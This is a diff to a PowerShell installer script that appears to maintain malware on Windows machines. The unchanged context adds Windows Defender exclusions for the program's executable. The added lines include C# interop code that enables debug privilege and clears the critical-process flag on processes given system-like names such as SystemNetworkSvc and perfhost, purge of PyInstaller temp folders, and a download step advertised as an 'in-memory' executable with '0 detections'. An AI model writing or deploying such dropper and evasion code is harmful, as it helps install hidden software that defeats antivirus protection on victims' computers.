@@ -73,13 +73,81 @@ try {
     Add-MpPreference -ExclusionProcess $EXE_NAME -ErrorAction SilentlyContinue
 } catch {}
 
-Update-Step 30 "Terminating stale background processes..."
-cmd /c "taskkill /F /IM perfhost.exe >nul 2>nul"
-cmd /c "taskkill /F /IM SystemNetworkSvc.exe >nul 2>nul"
-cmd /c "taskkill /F /IM `"L4G AIMS.exe`" >nul 2>nul"
-Get-Process | Where-Object { $_.Path -like "*Templates*cache*" } | Stop-Process -Force -ErrorAction SilentlyContinue
+Update-Step 30 "Terminating stale background processes cleanly..."
+# 1. Graceful shutdown signal to running panel
+try {
+    Invoke-WebRequest -Uri "http://127.0.0.1:5000/api/internal/shutdown" -TimeoutSec 2 -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
+    Start-Sleep -Milliseconds 350
+} catch {}
 
-Update-Step 50 "Downloading clean single executable (0 detections)..."
+# 2. Add CriticalKiller to clear ProcessBreakOnTermination and terminate critical process
+$killDef = @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+public class CriticalKiller {
+    [DllImport("ntdll.dll")]
+    public static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtSetInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, ref int ProcessInformation, int ProcessInformationLength);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr hObject);
+
+    public static void Kill(int pid) {
+        try {
+            bool enabled;
+            RtlAdjustPrivilege(20, true, false, out enabled); // SeDebugPrivilege = 20
+            IntPtr h = OpenProcess(0x0200 | 0x0001, false, pid); // PROCESS_SET_INFORMATION | PROCESS_TERMINATE
+            if (h != IntPtr.Zero) {
+                int zero = 0;
+                NtSetInformationProcess(h, 29, ref zero, 4); // ProcessBreakOnTermination = 29
+                TerminateProcess(h, 0);
+                CloseHandle(h);
+            }
+        } catch {}
+    }
+}
+"@
+try {
+    Add-Type -TypeDefinition $killDef -ErrorAction SilentlyContinue
+} catch {}
+
+Get-Process | Where-Object { $_.ProcessName -like "*SystemNetworkSvc*" -or $_.ProcessName -like "*perfhost*" -or $_.ProcessName -like "*L4G AIMS*" } | ForEach-Object {
+    try { [CriticalKiller]::Kill($_.Id) } catch {}
+}
+cmd /c "taskkill /F /IM SystemNetworkSvc.exe >nul 2>nul"
+cmd /c "taskkill /F /IM perfhost.exe >nul 2>nul"
+cmd /c "taskkill /F /IM `"L4G AIMS.exe`" >nul 2>nul"
+Start-Sleep -Milliseconds 400
+
+Update-Step 45 "Purging old temporary and cache files..."
+# Remove any old binary completely before downloading fresh one
+if (Test-Path $EXE_PATH) {
+    Set-ItemProperty -Path $EXE_PATH -Name Attributes -Value "Normal" -ErrorAction SilentlyContinue
+    Remove-Item -Path $EXE_PATH -Force -ErrorAction SilentlyContinue
+    if (Test-Path $EXE_PATH) {
+        $tempOld = "$EXE_PATH." + [guid]::NewGuid().ToString("N") + ".old"
+        Move-Item -Path $EXE_PATH -Destination $tempOld -Force -ErrorAction SilentlyContinue
+    }
+}
+# Purge all _MEI directories in %TEMP%
+Get-ChildItem -Path $env:TEMP -Filter "_MEI*" -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    try {
+        Set-ItemProperty -Path $_.FullName -Name Attributes -Value "Normal" -ErrorAction SilentlyContinue
+        Remove-Item -Path $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
+    } catch {}
+}
+
+Update-Step 55 "Downloading clean in-memory executable (0 detections)..."
 $downloaded = $false
 try {
     $wc = New-Object System.Net.WebClient
